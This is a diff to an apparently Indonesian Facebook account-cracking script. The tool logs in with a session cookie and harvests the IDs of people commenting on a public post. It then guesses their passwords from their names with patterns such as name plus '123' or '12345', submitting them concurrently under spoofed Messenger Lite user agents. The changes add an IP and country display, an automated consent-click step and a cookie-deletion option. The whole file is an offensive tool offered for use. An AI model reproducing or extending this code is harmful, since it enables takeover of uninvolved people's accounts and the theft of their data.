@@ -68,17 +68,23 @@ class Logo:
 ###----------[ BAGIAN LOGIN ]---------- ###
 class Login:
 	
+	###----------[ FUNCTION INIT ]---------- ###
+	def __init__(self):
+		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
+		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
+
 	###----------[ MENU LOGIN ]---------- ###
 	def menu_login(self):
 		Logo().logonya()
+		prints(Panel(f"{P2}{self.ip}",padding=(0,30),subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
 		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook
 [{color_text}02{P2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
 		login = console.input(f" {H2}• {P2}pilih menu : ")
 		if login in["1","01"]:
 			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=80,style=f"{color_panel}"))
 			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
-			open("data/cookie","w").write(cookie)
-			login_cookie(cookie)
+			#open("data/cookie","w").write(cookie)
+			self.login_cookie(cookie)
 		else:
 			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
 			
@@ -87,10 +93,21 @@ class Login:
 		try:
 			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
 			if "Apa yang Anda pikirkan sekarang" in url:
-				open("data/cookie","w").write(cookie)
+				pass
 			else:
-				self.ubah_bahasa(cookie)
-				open("data/cookie","w").write(cookie)
+				for z in url.find_all("a",href=True):
+					if "Tidak, Terima Kasih" in z.text:
+						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
+						parsing = parser(get.text,"html.parser")
+						action = parsing.find("form",{"method":"post"})["action"]
+						data = {
+							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
+							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
+							"submit": "OK, Gunakan Data"
+						}
+						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
+						break
+			open("data/cookie","w").write(cookie)
 			Menu().menu()
 		except:
 			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=80,style=f"{color_panel}"))
@@ -165,7 +182,7 @@ class Menu:
 			
 		###----------[ KOMENTAR ]---------- ###
 		elif menu in["3","03"]:
-			prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
+			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan id postingan : ")
 			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
 			Crack().atursandi()
@@ -366,7 +383,6 @@ class Crack:
 								pass 
 							else:
 								pwx.append(depan+"123")
-								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 						else:
 							if len(depan)<3:
@@ -374,7 +390,6 @@ class Crack:
 							else:
 								pwx.append(nama)
 								pwx.append(depan+"123")
-								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 							belakang = nama.split(" ")[1]
 							if len(belakang)<3:
@@ -382,7 +397,6 @@ class Crack:
 							else:
 								pwx.append(depan+belakang)
 								pwx.append(belakang+"123")
-								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
 						fall.submit(self.metode_api,user,pwx)
 					except:
@@ -470,6 +484,9 @@ class Lain:
 			self.ganti_tema()
 		elif menu in["05","5"]:
 			self.tampil_cookie()
+		elif menu in["06","6"]:
+			os.system("rm data/cookie")
+			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
 		else:
 			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
 
@@ -563,7 +580,7 @@ class Session:
 		versi_android = random.randint(4,12)
 		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
 		versi_app = random.randint(410000000,499999999)
-		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+		ugent = f"Mozilla/5.0 (Linux; Android {versi_android}; Nokia_x Build/{str(random.randint(4,10))}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/Nokia_x;FBBD/Nokia_x;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
 		return ugent
 		
 if __name__=="__main__":
@@ -574,3 +591,4 @@ if __name__=="__main__":
 	try:os.mkdir("data")
 	except:pass
 	Menu().menu()
+#Gunakan Facebook dalam mode dasar dengan Telkomsel
